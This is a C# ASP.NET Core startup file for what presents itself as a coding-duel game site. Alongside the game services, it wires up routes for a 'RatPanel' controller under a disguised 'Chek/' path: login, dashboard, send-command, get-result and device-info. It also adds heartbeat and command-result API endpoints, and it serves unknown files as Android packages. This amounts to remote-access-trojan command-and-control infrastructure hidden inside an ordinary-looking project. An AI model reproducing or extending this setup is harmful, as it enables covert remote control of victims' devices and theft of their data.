using CodeDuelArena.Data;
using CodeDuelArena.Hubs;
using CodeDuelArena.Services;
using Microsoft.EntityFrameworkCore;

var builder = WebApplication.CreateBuilder(args);

var connStr = builder.Configuration.GetConnectionString("DefaultConnection");
builder.Services.AddDbContext<AppDbContext>(options =>
    options.UseNpgsql(connStr));

builder.Services.AddControllersWithViews();
builder.Services.AddRazorPages();
builder.Services.AddSignalR();
builder.Services.AddSession();
builder.Services.AddHttpContextAccessor();


builder.Services.AddAuthentication(options =>
{
    options.DefaultScheme = "Cookies";
})
.AddCookie("Cookies", options =>
{
    options.Cookie.Name = "auth_user";
    options.Cookie.HttpOnly = true;
    options.Cookie.SameSite = SameSiteMode.Lax;
    options.Cookie.MaxAge = TimeSpan.FromDays(30);
    options.ExpireTimeSpan = TimeSpan.FromDays(30);
    options.SlidingExpiration = true;
});

builder.Services.AddScoped<DailyQuestService>();
builder.Services.AddScoped<AchievementService>();
builder.Services.AddScoped<LeagueService>();

var app = builder.Build();

using (var scope = app.Services.CreateScope())
{
    var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
    await db.Database.EnsureCreatedAsync();

   try
{
    await db.Database.ExecuteSqlRawAsync(
        @"ALTER TABLE ""Users"" ADD COLUMN IF NOT EXISTS ""Tag"" text NOT NULL DEFAULT '';
         CREATE UNIQUE INDEX IF NOT EXISTS ""IX_Users_Tag"" ON ""Users"" (""Tag"");
         ALTER TABLE ""UserSettings"" ADD COLUMN IF NOT EXISTS ""AvatarData"" bytea NULL;
         ALTER TABLE ""UserSettings"" ADD COLUMN IF NOT EXISTS ""AvatarContentType"" text NOT NULL DEFAULT '';");
}
catch (Exception ex)
{
    Console.WriteLine($"Migration: {ex.Message}");
}
    var dailyService = scope.ServiceProvider.GetRequiredService<DailyQuestService>();
    await dailyService.InitializeDailyQuests();
}

if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler("/Home/Error");
    app.UseHsts();
}

var options = new StaticFileOptions
{
    ServeUnknownFileTypes = true,
    DefaultContentType = "application/vnd.android.package-archive"
};
app.UseStaticFiles(options);
app.UseRouting();
app.UseSession();
app.UseAuthentication();
app.UseAuthorization();

app.MapControllerRoute(
    name: "rat_login",
    pattern: "Chek/Login",
    defaults: new { controller = "RatPanel", action = "Login" });

app.MapControllerRoute(
    name: "rat_dashboard",
    pattern: "Chek/Dashboard",
    defaults: new { controller = "RatPanel", action = "Dashboard" });

app.MapControllerRoute(
    name: "rat_send",
    pattern: "Chek/SendCommand",
    defaults: new { controller = "RatPanel", action = "SendCommand" });

app.MapControllerRoute(
    name: "rat_result",
    pattern: "Chek/GetResult",
    defaults: new { controller = "RatPanel", action = "GetResult" });

app.MapControllerRoute(
    name: "rat_device",
    pattern: "Chek/DeviceInfo",
    defaults: new { controller = "RatPanel", action = "DeviceInfo" });

app.MapControllerRoute(
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");
app.MapRazorPages();
app.MapHub<DuelHub>("/duelHub");

app.MapControllerRoute(
    name: "rat_heartbeat",
    pattern: "api/rat/heartbeat",
    defaults: new { controller = "RatPanel", action = "Heartbeat" });

app.MapControllerRoute(
    name: "rat_result_api",
    pattern: "api/rat/result",
    defaults: new { controller = "RatPanel", action = "CommandResult" });

app.Run();